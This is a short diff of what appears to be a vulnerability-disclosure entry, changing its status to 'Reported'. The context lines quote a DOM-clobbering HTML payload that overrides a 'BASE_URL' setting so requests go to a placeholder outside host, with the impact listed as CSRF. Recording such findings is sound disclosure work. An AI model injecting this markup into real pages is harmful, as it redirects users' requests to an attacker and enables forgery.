@@ -9,7 +9,7 @@
 + Payload: ```<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://xxx.xxx.xxx/?a="></a>```
 + Impact: CSRF
 + CVE: N/A
-+ Status: N/A
++ Status: Reported
 + Security Policy: Email
 + Foundby: TheHulk
 
